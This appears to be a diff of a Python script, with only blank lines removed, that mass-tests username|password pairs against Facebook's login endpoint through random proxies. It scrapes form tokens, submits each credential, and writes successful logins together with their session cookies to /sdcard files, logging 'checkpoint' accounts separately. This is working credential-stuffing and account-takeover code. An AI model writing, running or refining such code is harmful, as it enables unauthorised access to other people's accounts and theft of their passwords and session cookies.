@@ -34,22 +34,18 @@ for user in dx:
     print("📲 TOTAL ID : 1")
     print("🔄 PROCESSING ONE ID...")
     linex()
-
     try:
         ids, pw = user.split('|')
         ids, pw = ids.strip(), pw.strip()
     except:
         continue
-
     sys.stdout.write(f"\r ⏳ (M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
     sys.stdout.flush()
-
     try:
         nip = random.choice(xvx)
         proxs = {'http': nip}
         Session = requests.Session()
         free_fb = Session.get('https://m.facebook.com').text
-
         data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', free_fb).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', free_fb).group(1),
@@ -67,12 +63,10 @@ for user in dx:
             'prefill_type': 'password',
             'encpass': f"#PWD_BROWSER:0:{str(time.time()).split('.')[0]}:{pw}"
         }
-
         cookies = {
             'locale': 'hi_IN',
             'wd': '885x751',
         }
-
         headers = {
             'authority': 'www.facebook.com',
             'accept': '*/*',
@@ -82,12 +76,9 @@ for user in dx:
             'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0 Safari/537.36',
         }
-
         url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
         response = Session.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False)
-
         cookie_data = Session.cookies.get_dict()
-
         if "c_user" in cookie_data:
             cid = cookie_data["c_user"]
             coki = ";".join([f"{k}={v}" for k, v in cookie_data.items()])
@@ -95,15 +86,12 @@ for user in dx:
             print(f"🍪 Cookie: {coki}")
             open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
             oks.append(cid)
-
         elif 'checkpoint' in cookie_data:
             print(f"\n⚠️ CHECKPOINT: {ids}|{pw}")
             open('/sdcard/ATOM-CP.txt', 'a').write(f'{ids}|{pw}\n')
             cps.append(ids)
-
         else:
             print("\n❌ FAIL: Login not successful.")
-
     except Exception as e:
         print(f"\n⚠️ ERROR: {e}")
         time.sleep(2)
